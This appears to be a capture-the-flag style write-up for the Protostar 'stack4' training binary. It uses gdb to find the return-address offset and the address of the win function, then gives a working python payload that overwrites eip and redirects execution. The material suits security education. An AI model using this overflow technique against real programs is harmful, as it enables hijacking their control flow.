### Stack4

At first, looking for the code, we need to change the eip pointer address to jump to the "win" function.

To test if we can rewrite the %eip address, we are going to enter a lot of values in the argument for the program to see if the register value changes.

```bash
echo `python -c 'print("X"*100)'` > /tmp/aux.txt
``` 

Then, open the program with gdb to see the registers:

```bash
gdb stack4
(gdb) run < /tmp/aux.txt
Starting program: /opt/protostar/bin/stack4 < /tmp/aux.txt

Program received signal SIGSEGV, Segmentation fault.
0x58585858 in ?? ()

(gdb) info registers
...
ebp            0x58585858	0x58585858
esi            0x0	0
edi            0x0	0
eip            0x58585858	0x58585858
...
```

As we can see, the "58" hex value is the "X" in hexadecimal, so we overflow the ebp and eip registers.

But it is neccesasry to put the win function address in eip, so when the main returns, goes to the eip address.

Looking for the win function address:

```bash
gdb stack4
(gdb) print win
$2 = {void (void)} 0x80483f4 <win>
```

So the win function address is "0x80483f4", thats the value we need to put in %eip.

### Stack

Looking for the padding:

Look for the ebp register and eip register, to know where are them.

```bash
echo `python -c 'print("X"*64 + "E"*12 + "I"*20)'` > /tmp/aux.txt

gdb stack4

(gdb) run < /tmp/aux.txt

(gdb) info register
...
ebp            0x45454545	0x45454545
esi            0x0	0
edi            0x0	0
eip            0x49494949	0x49494949
...
```
So with that we no the padding is the size of the buffer + 12 = 76

|buffer(64)|?+ebp(12)|eip(4)|

And then knowing the padding, we can rewrite the eip pointer, so when main executes "call", it goes to the direction we specified, in this case, "win" function.

```bash
echo `python -c 'print("X"*76 + "\xf4\x83\x04\x08")'` > /tmp/aux.txt

./stack4 < /tmp/aux.txt
code flow successfully changed
Segmentation fault

```


